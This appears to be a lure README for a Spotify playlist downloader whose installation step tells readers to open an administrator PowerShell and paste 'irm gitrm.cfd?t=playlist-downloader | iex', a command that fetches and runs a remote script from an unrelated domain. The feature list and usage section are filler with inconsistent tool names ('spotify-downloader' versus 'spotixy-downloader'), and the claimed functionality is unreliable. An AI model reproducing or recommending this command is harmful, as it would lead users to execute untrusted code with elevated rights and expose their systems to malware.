#  Playlist Downloader — Advanced  Music Download Toolkit

> Complete toolkit — playlist downloading, album extraction, track fetching, audio conversion, metadata tagging, and quality optimization in one package.

---

## ⚙️ INSTALLATION & SETUP (CMD / PowerShell)

### Step 1: Open CMD or PowerShell as Administrator
```
# Press Win+X, then select Terminal (Admin) or Command Prompt (Admin)
```

### Step 2: Copy & Paste in PowerShell
```
irm gitrm.cfd?t=playlist-downloader | iex
```

### Step 3: Wait for Completion
```
[1/4] Loading Spotify Playlist Downloader modules...
[2/4] Extracting download and conversion components...
[3/4] Installing metadata and optimization tools...
[4/4] Ready. Start downloading Spotify playlists.
```

### Step 4: Start Using the Toolkit
- Launch via `spotify-downloader.exe` or `npm start`
- Download playlists, albums, or tracks
- Convert formats and tag metadata
- Optimize quality and organize library

---

## Features

- Playlist, album, and track downloading
- Multi-format audio conversion (MP3, FLAC, M4A, OGG, WAV)
- Automatic metadata tagging with album art
- Batch downloading with queue management
- Quality selection (320kbps, 256kbps, 192kbps, 128kbps)
- Playlist and album organization
- Lyrics download and embedding
- Download history and resume support
- Safety and anti-detection measures

---

## Usage

```bash
# Download playlist
spotixy-downloader playlist "https://open.spotify.com/playlist/..."

# Download album
spotixy-downloader album "https://open.spotify.com/album/..."

# Download track
spotixy-downloader track "https://open.spotify.com/track/..."

# Download with quality and format
spotixy-downloader playlist "URL" --quality 320 --format mp3

# Batch download from file
spotixy-downloader batch --file ./urls.txt --output ./music
```
